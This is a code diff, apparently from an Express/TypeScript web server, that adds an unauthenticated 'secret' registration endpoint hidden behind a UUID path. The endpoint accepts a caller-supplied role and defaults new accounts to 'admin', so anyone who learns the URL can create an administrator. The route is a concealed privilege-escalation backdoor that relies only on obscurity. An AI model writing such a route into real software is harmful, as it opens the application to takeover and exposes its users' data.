@@ -248,6 +248,43 @@ export async function registerRoutes(
     res.json({ ok: true });
   });
 
+  // Secret registration route with a UUID to prevent bot discovery
+  app.post("/api/auth/register-8fbe54ad-291b-4b10-8533-8c4bf6cd5d12", async (req, res) => {
+    const { username, email, password, firstName, lastName, role } = req.body || {};
+    if (!username || !email || !password) {
+      return res.status(400).json({ message: "username, email and password are required" });
+    }
+    try {
+      const existing = await storage.getUserByIdentifier(username);
+      const existingEmail = await storage.getUserByIdentifier(email);
+      if (existing || existingEmail) {
+        return res.status(400).json({ message: "User or email already exists" });
+      }
+
+      const passwordHash = hashPassword(password);
+      const inserted = await db
+        .insert(users)
+        .values({
+          username,
+          email,
+          passwordHash,
+          firstName: firstName || null,
+          lastName: lastName || null,
+          role: role || "admin",
+        } as any)
+        .returning();
+      
+      res.status(201).json({ 
+        ok: true, 
+        message: "User registered successfully", 
+        user: { id: inserted[0].id, username: inserted[0].username, role: inserted[0].role } 
+      });
+    } catch (err) {
+      console.error("Secret registration error:", err);
+      res.status(500).json({ message: "Internal server error" });
+    }
+  });
+
   // Contacts API
   app.post(api.contacts.create.path, async (req, res) => {
     try {
